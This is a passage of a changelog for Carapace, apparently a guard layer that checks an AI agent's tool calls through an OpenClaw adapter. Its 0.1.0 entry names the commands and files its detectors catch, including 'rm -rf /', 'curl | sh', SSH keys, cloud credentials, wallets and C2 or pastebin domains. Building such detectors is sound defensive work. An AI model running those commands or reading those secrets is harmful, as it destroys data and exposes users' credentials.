- **ESLint configuration**: Flat config with `@typescript-eslint` rules for code quality enforcement.
- **GitHub Actions CI**: Automated lint, build, and test on push/PR for Node 20 and 22.
- **CHANGELOG.md**: This file.

### Changed
- User-provided regex patterns in `sensitivePathPatterns` and `blockedDomains` are now validated with try-catch — invalid patterns are silently skipped instead of crashing the runtime.
- `WebhookSink` and `LogFileSink` now log errors to stderr on failure instead of silently swallowing exceptions.
- TypeScript badge updated to `5.4+` to reflect minimum requirement.
- PNG assets optimized (logo 1.7 MB → 163 KB, icon 351 KB → 56 KB).

### Removed
- Unused `licenseKey` field from `CarapaceConfig`.
- Extraneous `@carapace/pro` reference in `package-lock.json`.

## [0.1.0] - 2026-03-09

### Added
- Core rule engine with trusted-skill bypass.
- **ExecGuard**: 18 patterns detecting dangerous shell commands (rm -rf /, curl | sh, etc.).
- **PathGuard**: 20+ patterns detecting access to SSH keys, cloud credentials, browser data, crypto wallets, system auth files.
- **NetworkGuard**: 6 categories detecting suspicious network activity (ngrok, pastebin, crypto mining, C2 domains, etc.).
- Alert routing with `ConsoleSink`, `WebhookSink`, `LogFileSink` and 5-minute deduplication.
- OpenClaw adapter with `before_tool_call` blocking and `after_tool_call` observability hooks.
- Comprehensive test suite (161 tests).
- Bilingual documentation (Chinese + English): README, design docs.
